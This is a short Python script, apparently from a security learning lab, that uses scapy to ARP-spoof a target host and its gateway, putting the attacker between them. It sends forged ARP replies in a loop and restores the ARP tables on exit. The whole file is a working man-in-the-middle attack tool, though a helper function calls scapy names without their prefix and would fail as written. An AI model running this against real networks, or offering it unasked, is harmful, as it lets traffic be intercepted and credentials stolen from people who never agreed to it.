import scapy.all as scapy
#from  network_scanner import get_ip_and_mac_from_scan
import sys
import time

def get_ip_and_mac_from_scan(ip):
    arp_request=ARP(pdst=ip)
    broadcast=Ether(dst="ff:ff:ff:ff:ff:ff")#default broadcast mac in network
    arp_request_broadcast=broadcast/arp_request # encapsulate arp in this ethernet
    #print(arp_request_broadcast.summary())
    #arp_request_broadcast.show() #show details of packet and thus encapsulation between both
    ans, _ = srp(arp_request_broadcast,timeout=2,verbose=False) #return answered and unanswered
    return [(received.psrc , received.hwsrc ) for sent,received in ans]


def spoof(target_ip,spoof_ip):
    _, target_mac=get_ip_and_mac_from_scan(target_ip)[0]
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)


def restore(destination_ip,source_ip):
    _,destination_mac=get_ip_and_mac_from_scan(destination_ip)[0]
    _,source_mac=get_ip_and_mac_from_scan(source_ip)[0]
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,verbose=False,count=4)

if __name__ == "__main__":
    target_ip='10.0.2.13'
    gateway_ip='10.0.2.1'

    try:
        packets_sent_count=0
        while True:
            spoof(target_ip,gateway_ip)
            spoof(gateway_ip,target_ip)
            packets_sent_count+=2
            print('\r[+] Sent {}'.format(packets_sent_count),end=""),
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print('\n[-] Detected CTRL + C ... Ressetting ARP tables ... Please Wait.\n')
    finally:
        restore(target_ip,gateway_ip)
        restore(gateway_ip,target_ip)